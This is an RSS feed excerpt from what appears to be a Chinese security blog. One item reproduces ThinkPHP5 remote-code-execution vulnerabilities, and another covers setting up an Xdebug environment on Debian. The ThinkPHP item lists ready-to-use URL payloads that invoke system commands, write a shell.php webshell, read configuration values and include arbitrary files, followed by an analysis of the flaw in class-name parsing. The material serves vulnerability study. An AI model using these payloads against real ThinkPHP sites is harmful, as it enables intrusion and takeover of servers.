<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>代码审计 on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
    <description>Recent content in 代码审计 on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Fri, 12 Mar 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>thinkphp5代码审计</title>
      <link>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
      <pubDate>Fri, 12 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
      <description>本篇博文会复现大多数tp5的漏洞，持续更新
审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便
composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
&amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
PhpStorm+Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
框架基本流程 讲的很不错：https://paper.seebug.org/888/#_4
RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
未开启强制路由
参考：
https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
https://paper.seebug.org/888/#poc
https://xz.aliyun.com/t/3570
 payload:
5.1.x ：
?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.php文件 ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf
洞其实不在这里
在路由调度的时候：
跟进到thinkphp/library/think/route/dispatch/Module.php:
跟进controller方法：(thinkphp/library/think/App.php)
跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)
这个方法先对$name(类名)进行判断，当$name含有\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：
 thinkphp/library/think/Container.</description>
    </item>
    
    <item>
      <title>Debian下PHP Xdebug调试环境搭建</title>
      <link>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</link>
      <pubDate>Fri, 19 Feb 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</guid>
      <description>Debian下PHP Xdebug调试环境搭建  本文永久链接：http://wh1sper.com/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/
 前言 Xdebug是PHP的扩展，用于协助调试和开发。
 它包含一个用于IDE的调试器 它升级了PHP的var_dump()函数 它为通知，警告，错误和异常添加了堆栈跟踪 它具有记录每个函数调用和磁盘变量赋值的功能 它包含一个分析器 它提供了与PHPUnit一起使用的代码覆盖功能。  本地跟代码必备的工具。 但不推荐在生产环境中使用xdebug，因为他太重了。
预置环境   OS: Kali GNU/Linux Rolling x86_64
  Kernel: 5.7.0-kali1-amd64
  PHP version: 7.4.14
  Server API: FPM/FastCGI
  nginx version: nginx/1.18.0
  PhpStorm version: 2020.3
  下载安装Xdebug 访问https://xdebug.org/wizard
在web服务器中放入phpinfo，（注意最好是使用web服务，如果是本地php脚本的话php.ini可能会不一样）
访问之后将整个页面源码Ctrl+A Ctrl+C复制到框里面： 分析之后会自动给你最合适的版本，并且告诉你后续安装步骤。
下载给出的.tar.tgz文件
1.安装PHP拓展
apt-get install php-dev autoconf automake2.解压
tar -xvzf xdebug-3.0.2.tgzcd xdebug-3.0.23.</description>
    </item>
    
  </channel>
</rss>
